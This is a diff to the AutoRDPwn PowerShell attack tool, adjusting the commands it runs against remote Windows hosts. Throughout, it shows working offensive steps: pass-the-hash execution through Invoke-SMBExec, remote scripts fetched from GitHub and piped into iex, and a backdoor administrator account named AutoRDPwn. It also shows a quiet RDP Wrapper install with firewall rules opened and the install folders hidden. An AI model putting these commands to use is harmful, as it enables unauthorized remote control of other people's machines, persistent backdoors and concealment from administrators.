@@ -116,9 +116,10 @@ if($Language -in 'English') {
   $Pwn4  = "netsh advfirewall firewall set rule group = 'Windows Management Instrumentation (WMI)' new enable = yes; netsh advfirewall firewall set rule group = 'Windows Remote Management' new enable = yes"
   $Pwn5  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemoteWMI.ps1 | iex ; Set-RemoteWMI -UserName $user"
   $Pwn6  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemotePSRemoting.ps1 | iex ; Set-RemotePSRemoting -UserName $user"
-  $Pwn6b = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemotePSRemoting.ps1 | iex ; Set-RemotePSRemoting -UserName AutoRDPwn"
   $Pwn7  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDPwn /add"
-  $Pwn8  = "RDP session agent" }
+  $Pwn8  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemoteWMI.ps1 | iex ; Set-RemoteWMI -UserName AutoRDPwn"
+  $Pwn9  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemotePSRemoting.ps1 | iex ; Set-RemotePSRemoting -UserName AutoRDPwn"
+  $Pwn10 = "RDP session agent" }
 
 if($Language -in 'Spanish') {
   $txt1  = "Cargar módulos adicionales"
@@ -175,9 +176,10 @@ if($Language -in 'Spanish') {
   $Pwn4  = "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule group='Administración remota de Windows' new enable=yes"
   $Pwn5  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemoteWMI.ps1 | iex ; Set-RemoteWMI -UserName $user"
   $Pwn6  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemotePSRemoting.ps1 | iex ; Set-RemotePSRemoting -UserName $user"
-  $Pwn6b = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemotePSRemoting.ps1 | iex ; Set-RemotePSRemoting -UserName AutoRDPwn"
   $Pwn7  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDPwn /add"
-  $Pwn8  = "Agente de sesión de RDP" }
+  $Pwn8  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemoteWMI.ps1 | iex ; Set-RemoteWMI -UserName AutoRDPwn"
+  $Pwn9  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemotePSRemoting.ps1 | iex ; Set-RemotePSRemoting -UserName AutoRDPwn"
+  $Pwn10 = "Agente de sesión de RDP" }
 
     $Powershell = (Get-Host | findstr "Version" | select -First 1).split(':')[1].trim() ; Write-Host""
     if($Powershell -lt 5) { Write-Host "$txt3a" -ForegroundColor 'Red' ; Write-Host ; Write-Host "$txt3b" -NoNewLine -ForegroundColor 'Red'
@@ -228,7 +230,8 @@ if($Language -in 'Spanish') {
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn5"
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn6"
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn7"
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn6b" }
+	Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn8"
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn9" }
 
 	'3' {
         Write-Host
@@ -430,9 +433,9 @@ if($Language -in 'Spanish') {
 
     invoke-command -session $RDP[0] -scriptblock { 
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-RDPwrap.ps1" -UseBasicParsing | iex
-    msiexec /i "RDPWInst-v1.6.2.msi" /quiet /qn /norestart ; netsh advfirewall firewall delete rule name="$using:Pwn8" 2>&1> $null
-    netsh advfirewall firewall add rule name="$using:Pwn8" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
-    netsh advfirewall firewall add rule name="$using:Pwn8" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
+    msiexec /i "RDPWInst-v1.6.2.msi" /quiet /qn /norestart ; netsh advfirewall firewall delete rule name="$using:Pwn10" 2>&1> $null
+    netsh advfirewall firewall add rule name="$using:Pwn10" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
+    netsh advfirewall firewall add rule name="$using:Pwn10" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
     attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null ; attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null ; sleep -milliseconds 7500 ; rm .\RDPWInst-v1.6.2.msi 2>&1> $null } 
     
     $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
